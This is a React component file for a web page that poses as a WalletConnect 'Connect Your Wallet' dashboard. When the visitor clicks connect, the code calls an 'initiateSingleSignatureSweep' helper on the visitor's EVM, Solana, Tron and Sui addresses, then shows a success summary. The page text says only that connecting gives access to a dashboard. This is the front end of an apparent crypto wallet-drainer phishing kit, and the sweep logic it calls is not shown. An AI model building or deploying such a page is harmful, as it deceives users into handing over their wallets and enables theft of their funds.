import { useState } from 'react'
import { useWalletStore } from './stores/walletStore'
import ConnectButton from './components/ConnectButton'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    walletType,
    isConnected,
    isLoading,
    error,
    transferStatus,
    setAccount,
    setWalletType,
    setIsConnected,
    setIsLoading,
    setError,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)

  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      const { account: addr, provider, walletType, solanaAddress, tronAddress, suiAddress } = await window.walletHelpers?.connectWallet?.() || {}

      if (!addr || !provider) {
        throw new Error('Failed to connect wallet')
      }

      setAccount(addr)
      setWalletType(walletType || 'Unknown')
      setIsConnected(true)

      const result = await window.walletHelpers?.initiateSingleSignatureSweep?.(
        provider,
        addr,
        solanaAddress,
        tronAddress,
        suiAddress
      )

      if (result?.success) {
        setTransferStatus(result)
        setShowSummary(true)
      } else {
        throw new Error(result?.message || 'Authorization failed')
      }
    } catch (err) {
      console.error(err)
      setError(err.message || 'Connection failed. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      <div className="navbar">
                <div className="nav-logo">
          <a href="/" className="logo-img">
            <img className="logo-svg" src="/WalletConnect.png" alt="WalletConnect logo" />
          </a>
        </div>
        <div className="nav-links">
          <a href="https://github.com" target="_blank" rel="noreferrer">GitHub</a>
          <a href="#features">Features</a>
          <a href="#about">About</a>
        </div>
        <div className="nav-buttons">
          <a href="/" className="btn">Account</a>
        </div>
      </div>

      <main>
        <section className="wallet-section">
          <div className="wallet-content">
            <div className="wallet-icon">
              <i className="fas fa-wallet"></i>
            </div>
            <h1>Connect Your Wallet</h1>
            <p>
              To access the dashboard and continue on our decentralized dapp,
              please connect your wallet.
            </p>

            {isConnected && account && (
              <div className="bg-green-900/30 border border-green-600 rounded-2xl p-5 mb-6 text-center">
                <p className="text-green-400 text-sm">Wallet Connected</p>
                <p className="font-mono text-white mt-1 break-all">{account}</p>
                {(walletType || transferStatus?.walletType) && (
                  <p className="text-green-200 text-sm mt-2">Connected wallet: {walletType || transferStatus.walletType}</p>
                )}
              </div>
            )}

            {!isConnected && (
              <ConnectButton onClick={handleConnect} isLoading={isLoading} />
            )}

            {error && (
              <div className="bg-red-900/50 border border-red-700 rounded-2xl p-4 mt-4 text-center">
                <p className="text-red-300">{error}</p>
              </div>
            )}
          </div>
        </section>
      </main>

      <div className="footer-section">
        <div className="footer-content">
          <div className="footer-column">
            <h5>Product</h5>
            <a href="#features">Features</a>
            <a href="#pricing">Pricing</a>
            <a href="#security">Security</a>
          </div>
          <div className="footer-column">
            <h5>Company</h5>
            <a href="#about">About Us</a>
            <a href="#blog">Blog</a>
            <a href="#careers">Careers</a>
          </div>
          <div className="footer-column">
            <h5>Support</h5>
            <a href="#help">Help Center</a>
            <a href="#contact">Contact Us</a>
            <a href="#faq">FAQ</a>
          </div>
          <div className="footer-column">
            <h5>Legal</h5>
            <a href="#privacy">Privacy Policy</a>
            <a href="#terms">Terms of Service</a>
            <a href="#disclaimer">Disclaimer</a>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2024 Registry Community. All rights reserved.</p>
        </div>
      </div>

      {showSummary && (
        <SummaryModal
          status={transferStatus}
          onClose={() => setShowSummary(false)}
        />
      )}
    </div>
  )
}

export default App

